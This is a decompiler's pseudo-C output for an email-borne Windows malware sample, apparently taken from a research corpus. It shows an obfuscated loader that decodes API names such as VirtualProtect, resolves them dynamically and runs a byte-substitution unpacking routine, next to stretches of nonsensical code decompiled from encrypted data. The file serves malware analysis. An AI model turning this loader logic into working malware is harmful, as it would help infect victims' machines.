// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1177/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

real64 fn00409268(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 ebp, word32 esi, word32 edi, word32 dwArg00, real64 rArg0)
{
fn00409268_entry:
l00409268:
	esp = fp
	branch Test(UGE,C) l00409269
	goto l0040926A
l00409269:
	v21 = Mem0[ebx + 0x00000000:word32] + 0x00000001
	Mem0[ebx + 0x00000000:word32] = v21
	SZO = cond(v21)
	goto l0040926B
l0040926A:
	ebp = ebp + ecx
	SCZO = cond(ebp)
l0040926B:
	int3()
	al = al - dh
	ebp = 0xE928CC52
	rArg0 = rArg0 - (real64) Mem0[(fp + 0x6BB31D74) + edx:word32]
	SCZO = cond(ch - Mem0[(ecx - 0x00000034) + 0x49466290:byte])
	v13 = Mem0[edi - 0x0000006B:byte] - dh
	Mem0[edi - 0x0000006B:byte] = v13
	ebp = 0xE928CC52 + ecx
	int3()
	v15 = Mem0[edx + 0x00000000:byte] - bh
	Mem0[edx + 0x00000000:byte] = v15
	SCZO = cond(v15)
	ebp = 0x7D28CC52
	dl = 0x98
	branch Test(UGT,CZ) l00409307
l00409290:
	SCZO = cond(cl - Mem0[0x7D28CC40:byte])
	int3()
	v19 = Mem0[0x7D28CC50:byte] - bh
	Mem0[0x7D28CC50:byte] = v19
	SCZO = cond(v19)
	C = SCZO (alias)
	SZO = SCZO (alias)
	SO = SCZO (alias)
	Z = SCZO (alias)
	CZ = SCZO (alias)
	SCZDOP = SCZO (alias)
	branch Test(UGT,CZ) l00409310
l00409299:
	branch Test(UGT,CZ) l004092D5
l0040929B:
	return rArg0
l004092D5:
	edi = edi - 0x00000001
	C = __aaa(al, ah, &al, &ah)
	SCZDOP = dwArg00
	esp = fp + 0x00000004
	ebp = 0xBD813754
	ecx = ecx + 0x00000001
	C = __aaa(al, ah, &al, &ah)
	v25 = Mem0[0x7B706EC0:word32] + edi
	Mem0[0x7B706EC0:word32] = v25
	esi = esi + Mem0[edi + 0x00000000:word32]
	eax = __indw(0xBD)
	al = (byte) eax (alias)
	ah = SLICE(eax, byte, 8) (alias)
	edx_eax = SEQ(edx, eax) (alias)
	esp = fp + 0x00000005
	C = __aaa(al, ah, &al, &ah)
	bh = bh + Mem0[0x92D96F14:byte] + C
	ebx = DPB(ebx, bh, 8, 8) (alias)
	Mem0[0x46965774:word32] = eax
	int3()
	v29 = Mem0[0x3A282828:byte] - bl
	Mem0[0x3A282828:byte] = v29
	SCZO = cond(v29)
	C = SCZO (alias)
	SZO = SCZO (alias)
	SO = SCZO (alias)
	Z = SCZO (alias)
	CZ = SCZO (alias)
	SCZDOP = SCZO (alias)
l004092FB:
	D = true
	eax = eax - 0x0A7D2828 - C
	SCZO = cond(eax)
	eax = (int32) ax
	branch Test(UGT,CZ) l0040937D
l00409306:
	esi = 0x28CC4631
	goto l0040930B
l00409307:
	v88 = Mem0[esi - 0x00000034:word32] ^ eax
	Mem0[esi - 0x00000034:word32] = v88
	SZO = cond(Mem0[esi - 0x00000034:word32])
	v89 = ebx[ecx * 0x02] - 0x98
	ebx[ecx * 0x02] = v89
	SCZO = cond(v89)
	goto l0040930D
l0040930B:
	al = al + 0x4B + C
	SCZO = cond(al)
l0040930D:
	v67 = eax
	eax = 0x28CC4631
	esi = v67
	esi = esi + 0x00000001
	SZO = cond(esi)
	int3()
l00409310:
	v32 = Mem0[0x280B721A:byte] - bl
	Mem0[0x280B721A:byte] = v32
	v33 = Mem0[eax + 0x00000000:byte] - ch
	Mem0[eax + 0x00000000:byte] = v33
	SCZO = cond(v33)
	C = SCZO (alias)
	SZO = SCZO (alias)
	SO = SCZO (alias)
	Z = SCZO (alias)
	CZ = SCZO (alias)
	SCZDOP = SCZO (alias)
	branch Test(GE,SO) l004092FB
l0040931A:
	cl = 0x77
	branch Test(UGT,CZ) l00409332
l0040931E:
	ebx = Mem0[0x57741AD5:word32] *s 0xFFFFFF96
	esi = esi + 0x00000001
	int3()
	v35 = Mem0[0xF7282828:byte] - bl
	Mem0[0xF7282828:byte] = v35
	SCZO = cond(v35)
	branch Test(EQ,Z) l00409357
l0040932F:
	v37 = Mem0[eax + 0x00000000:byte] - ch
	Mem0[eax + 0x00000000:byte] = v37
	SCZO = cond(v37)
	C = false
l00409332:
	v85 = Mem0[ebp + 0x00000031:byte]
	Mem0[ebp + 0x00000031:byte] = bh
	bh = v85
	eax = (int32) ax
	branch Test(UGT,CZ) l004093AF
l00409338:
	esi = 0x28CC48D2
	C = false
	edi = edi - 0x00000001
	SZO = cond(edi)
	branch Test(GE,SO) l004093A9
l00409341:
	eax = (int32) ax
	branch Test(UGT,CZ) l004093BB
l00409344:
	esi = 0x28CC4899
	SCZO = cond(ah - Mem0[eax + 0x00000000:byte])
	esi = 0x28CC489A
	int3()
	v86 = Mem0[edi - 0x0000006B:byte] - dh
	Mem0[edi - 0x0000006B:byte] = v86
	edx_eax = (int64) eax
	eax = eax - 0x00000001
	int3()
	v87 = Mem0[edi - 0x0000001F:byte] - dh
	Mem0[edi - 0x0000001F:byte] = v87
	SCZO = cond(v87)
	dh = 0xCC
	goto l00409359
l00409357:
	__outb(dx, al)
	int3()
l00409359:
	al = al - bh
	v76 = Mem0[edi - 0x0000006B:byte] - 0xCC
	Mem0[edi - 0x0000006B:byte] = v76
	edx_eax = (int64) eax
	eax = eax - 0x00000001
	int3()
	v78 = Mem0[edi - 0x0000001F:byte] - 0xCC
	Mem0[edi - 0x0000001F:byte] = v78
	edi = edi - 0x00000001
	esi = esi + 0x00000001
	int3()
	v79 = Mem0[edi - 0x0000006B:byte] - 0xCC
	Mem0[edi - 0x0000006B:byte] = v79
	v80 = (Mem0[eax - 0x00000034:byte] & 0x00) != 0x00
	Mem0[eax - 0x00000034:byte] = __ror(Mem0[eax - 0x00000034:byte], 0x77)
	v81 = Mem0[edi - 0x0000006B:byte] - 0xCC
	Mem0[edi - 0x0000006B:byte] = v81
	v82 = Mem0[esi - 0x00000034:word32] ^ eax
	Mem0[esi - 0x00000034:word32] = v82
	SZO = cond(Mem0[esi - 0x00000034:word32])
	v83 = Mem0[edi - 0x0000001F:byte] - 0xCC
	Mem0[edi - 0x0000001F:byte] = v83
	dh = 0xCC
	v84 = Mem0[edx + 0x00000000:byte] - bh
	Mem0[edx + 0x00000000:byte] = v84
	SCZO = cond(v84)
	goto l0040937B
l0040937A:
	SCZO = cond(al - dl)
l0040937B:
	__outb(dx, al)
l0040937D:
	int3()
	v38 = Mem0[edi - 0x0000006B:byte] - dh
	Mem0[edi - 0x0000006B:byte] = v38
	v39 = Mem0[esi - 0x00000034:word32] ^ eax
	Mem0[esi - 0x00000034:word32] = v39
	SZO = cond(Mem0[esi - 0x00000034:word32])
	v40 = Mem0[edi - 0x0000001F:byte] - dh
	Mem0[edi - 0x0000001F:byte] = v40
	dh = 0xCC
	al = al - bh
	v41 = Mem0[edx + 0x00000000:byte] - bh
	Mem0[edx + 0x00000000:byte] = v41
	v42 = Mem0[eax + 0x00000000:byte] - ch
	Mem0[eax + 0x00000000:byte] = v42
	v43 = Mem0[esi + 0x00000000:byte]
	Mem0[edi + 0x00000000:byte] = v43
	esi = esi + 0x00000001
	edi = edi + 0x00000001
	al = al - bh
	SCZO = cond(al)
	eax = eax - 0x2828283A - C
	SCZO = cond(eax)
	cl = 0x77
	v44 = eax
	eax = ebp
	ebp = v44
l0040939F:
	v45 = Mem0[esi - 0x00000034:word32] ^ eax
	Mem0[esi - 0x00000034:word32] = v45
	SZO = cond(Mem0[esi - 0x00000034:word32])
	v46 = Mem0[edi - 0x0000001F:byte] - dh
	Mem0[edi - 0x0000001F:byte] = v46
	edx = Mem0[esp + 0x00000000:word32]
	esp = esp + 0x00000004
	__outb(dx, al)
	int3()
	v48 = Mem0[edx + 0x00000000:byte] - ah
	Mem0[edx + 0x00000000:byte] = v48
	SCZO = cond(v48)
l004093A9:
	branch Test(UGE,C) l0040937A
l004093AC:
	SCZO = cond(al - bh)
	eax = eax - 0x00000001
	SZO = cond(eax)
l004093AF:
	int3()
	v49 = Mem0[edx + 0x00000000:byte] - bh
	Mem0[edx + 0x00000000:byte] = v49
	ebx = ebx + 0x00000001
	eax = eax - 0x00000001
	int3()
	v50 = Mem0[edx + 0x00000000:byte] - bh
	Mem0[edx + 0x00000000:byte] = v50
	ecx = ecx - 0x00000001
	eax = eax - 0x00000001
	int3()
	ah = ah - dh
	SCZO = cond(ah)
l004093BB:
	branch Test(UGT,CZ) l0040939F
l004093BE:
	eax = eax + 0x00000001
	__outb(dx, al)
	int3()
	v51 = Mem0[ecx + 0x1AC27D22:byte] - dl
	Mem0[ecx + 0x1AC27D22:byte] = v51
	v52 = Mem0[eax + 0x00000000:byte] - ch
	Mem0[eax + 0x00000000:byte] = v52
	al = al & 0x57
	esi = esi + 0x00000001
	int3()
	v53 = ecx[ebp * 0x08] - dl
	ecx[ebp * 0x08] = v53
	dl = dl << 0x3D
	esi = esi + 0x00000001
	int3()
	v54 = Mem0[edi + 0x0000001D:byte] - bl
	Mem0[edi + 0x0000001D:byte] = v54
	SCZO = cond(v54)
l004093D7:
	eax = eax | 0xF81D5214
	edx = edx - 0x00000001
	ch = ch & Mem0[edx + 0x77FCFC7D:byte]
	SZO = cond(ch)
	C = false
	branch Test(UGT,CZ) l0040945B
l004093E7:
	rArg0 = rArg0 * (real64) Mem0[edi + 0xF8474792:word32]
	v55 = Mem0[edx + 0x00000000:byte] - bh
	Mem0[edx + 0x00000000:byte] = v55
	SCZO = cond(eax - 0x7D28CC46)
	ah = 0x0C
	branch Test(UGT,CZ) l0040946F
l004093F8:
	SCZO = cond(bh - ch)
	eax = eax - 0x95772828 - C
	v56 = Mem0[esi - 0x00000034:word32] ^ eax
	Mem0[esi - 0x00000034:word32] = v56
	SZO = cond(Mem0[esi - 0x00000034:word32])
	al = al - bh
	v57 = Mem0[edi - 0x0000001F:byte] - dh
	Mem0[edi - 0x0000001F:byte] = v57
	eax = eax - 0x00000001
	__outb(dx, al)
	int3()
	al = al - bh
	SCZO = cond(al)
	ecx = ecx - 0x00000001
	branch Test(EQ,Z) && ecx != 0x00000000 l0040948B
l0040940E:
	esp = esp & edi
	SZO = cond(esp)
	C = false
	branch Test(UGT,CZ) l00409489
l00409412:
	esi = 0x28CC460A
	SCZO = cond(ch - Mem0[edx + 0x7728CCEE:byte])
	v58 = eax
	eax = ebp
	ebp = v58
	al = al | Mem0[0x28CC45D6:byte]
	v59 = Mem0[edi - 0x0000001F:byte] - dh
	Mem0[edi - 0x0000001F:byte] = v59
	dh = 0xCC
	al = al - bh
	SCZO = cond(al)
	eax = eax - 0x460A9577 - C
	int3()
	v60 = Mem0[edi - 0x0000006B:byte] - 0xCC
	Mem0[edi - 0x0000006B:byte] = v60
	v61 = Mem0[0x28CC45D6:word32] ^ eax
	Mem0[0x28CC45D6:word32] = v61
	SZO = cond(Mem0[0x28CC45D6:word32])
	v62 = Mem0[edi - 0x0000001F:byte] - 0xCC
	Mem0[edi - 0x0000001F:byte] = v62
	esi = 0x00028CC4
	al = al - bh
	al = al >> 0x28
	SCZO = cond(al)
	branch Test(UGT,CZ) l004093D7
l00409442:
	al = al | Mem0[0x00028C90:byte]
	v63 = Mem0[edi - 0x0000001F:byte] - 0xCC
	Mem0[edi - 0x0000001F:byte] = v63
	esi = 0x00000028
	v64 = ebx[ecx * 0x02] - dl
	ebx[ecx * 0x02] = v64
	v65 = eax
	eax = 0x00000028
	esi = v65
	esi = esi + 0x00000001
	int3()
	v66 = Mem0[0xA7F757D5:byte] - bl
	Mem0[0xA7F757D5:byte] = v66
	SCZO = cond(v66)
l0040945B:
	esp = esp - 0x00000004
	Mem0[esp + 0x00000000:word32] = edi
	al = al | Mem0[esi - 0x00000034:byte]
	v72 = Mem0[0xF8282828:byte] - bl
	Mem0[0xF8282828:byte] = v72
	v73 = Mem0[edx + 0x00000000:byte] - bh
	Mem0[edx + 0x00000000:byte] = v73
	ecx = Mem0[esp + 0x00000000:word32]
	esp = esp + 0x00000004
	eax = eax - 0x00000001
	int3()
	al = al - bh
	v74 = Mem0[edx + 0x00000000:byte] - bh
	Mem0[edx + 0x00000000:byte] = v74
	v75 = Mem0[eax + 0x00000000:word32] + ebp
	Mem0[eax + 0x00000000:word32] = v75
	SCZO = cond(v75)
	goto l00409470
l0040946F:
	v68 = Mem0[edx + 0x00000000:byte] - bl
	Mem0[edx + 0x00000000:byte] = v68
	SCZO = cond(v68)
l00409470:
	al = al - bh
	al = al - bh
	al = al - bh
	v69 = Mem0[edx + 0x00000000:byte] - bh
	Mem0[edx + 0x00000000:byte] = v69
	SCZO = cond(v69)
l00409489:
	SCZO = cond(cl - Mem0[edx + 0x00000000:byte])
l0040948B:
	esi = esi + 0x00000001
	int3()
	al = al - bh
	al = al >> 0x28
	SCZO = cond(cl - Mem0[ebx + 0x00000000:byte])
	esp = esp - 0x00000004
	Mem0[esp + 0x00000000:word32] = edx
	int3()
	v70 = Mem0[edi - 0x0000006B:byte] - dh
	Mem0[edi - 0x0000006B:byte] = v70
	ecx = Mem0[esp + 0x00000000:word32]
	esp = esp + 0x00000004
	eax = eax - 0x00000001
	int3()
	v71 = Mem0[ebp - 0x00000006:byte] - bh
	Mem0[ebp - 0x00000006:byte] = v71
	SCZO = cond(v71)
fn00409268_exit:
}

bool fn0040A196(word32 dwArg04, word32 dwArg08, word32 dwArg0C, ptr32 eaxOut, ptr32 ecxOut, ptr32 edxOut, ptr32 ebxOut, ptr32 esiOut, ptr32 ediOut)
{
fn0040A196_entry:
l0040A196:
	word32 ebx_20 = dwArg0C
	word32 edx_22 = dwArg04
	word32 ecx_11 = dwArg08
l0040A1AC:
	byte ah_33 = Mem0[edx_22 + 0x00000000:byte]
	Mem43[fp - 0x00000010:word32] = 0x00000100
	word32 ecx_31 = 0x00000100
	word32 edi_38 = ebx_20
l0040A1BE:
	branch (word32) ah_33 == (word32) Mem43[edi_38 + 0x00000000:byte] l0040A1D8
l0040A1CA:
	word32 edi_59 = edi_38 + 0x00000021
	edi_38 = edi_59 - 0x00000020
	edx_22 = edx_106
	goto l0040A1E0
l0040A1D8:
l0040A1E0:
	ecx_31 = ecx_31 - 0x00000001
	word32 edx_106 = edx_22
	branch ecx_31 != 0x00000000 l0040A1BE
l0040A1E2:
	word32 edi_72 = edi_59 - 0x00000020 - ebx_20
	*ediOut = edi_72
	Mem86[edx_106 + 0x00000000:byte] = (byte) edi_72
	word32 esi_65
	*esiOut = 0x00000100
	*ebxOut = ebx_20
	byte SCZO_73 = cond(edi_72)
	word32 eax_79
	*eaxOut = edi_72
	edx_22 = edx_106 + 0x00000001
	*edxOut = edx_22
	ecx_11 = ecx_11 - 0x00000001
	*ecxOut = ecx_11
	branch ecx_11 != 0x00000000 l0040A1AC
l0040A1F8:
	return SCZO_73
fn0040A196_exit:
}

word32 fn0040A1FC(word32 dwArg04, word32 dwArg08)
{
	return GetProcAddress(LoadLibraryA(dwArg04), dwArg08);
}

bool fn0040A214(ptr32 eaxOut, ptr32 ecxOut, ptr32 edxOut, ptr32 ebxOut, ptr32 esiOut, ptr32 ediOut)
{
	Mem7[0x0040C3B1:word32] = 0x506C6175;
	Mem8[0x0040C39C:word32] = 0x32336C65;
	Mem9[0x0040C3B5:word32] = 0x65746F72;
	Mem10[0x0040C3AD:word32] = 0x74726956;
	Mem11[0x0040C398:word32] = 0x6E72656B;
	fn0040A1FC(0x0040C398, 0x0040C3AD)();
	word32 eax_51;
	word32 ecx_52;
	word32 edx_53;
	word32 ebx_54;
	word32 esi_55;
	word32 edi_56;
	return fn0040A196(0x00401008, Mem11[0x0040C070:word32], 0x0040C074, out eax_51, out ecx_52, out edx_53, out ebx_54, out esi_55, out edi_56);
}

void fn0040A299(word32 edx, word32 ebp)
{
fn0040A299_entry:
l0040A299:
	Mem12[0x0040C38A:word32] = VirtualAlloc(0x00000000, 0x00000190, 0x00002000, 0x00000004)
	GetVersion()
	VirtualFree(edx, 0x00000000, 0x00008000)
	Mem23[0x0040C3D7:word32] = 0x6C642E69
	Mem24[0x0040C3D0:word16] = 0x7049
	Mem25[0x0040C3D3:word32] = 0x7061706C
	word32 eax_30 = fn0040A1FC(0x0040C3D0, 0x0040C3ED)
	call eax_30 (retsize: 4; depth: 8)
	branch eax_30 != 0x00000057 l0040A2FF
l0040A2F8:
	word32 eax_56
	word32 ecx_57
	word32 edx_58
	word32 ebx_59
	word32 esi_60
	word32 edi_61
	fn0040A214(out eax_56, out ecx_57, out edx_58, out ebx_59, out esi_60, out edi_61)
	goto l0040A301
l0040A2FF:
	goto l0040A306
l0040A301:
	fn00409268(eax_56, ecx_57, edx_58, ebx_59, ebp, esi_60, edi_61, 0x0040C3D0, rArg0)
l0040A306:
	Mem54[fp - 0x00000008:word32] = 0x00000000
	ExitProcess(0x0040C3D0)
	int3()
fn0040A299_exit:
}

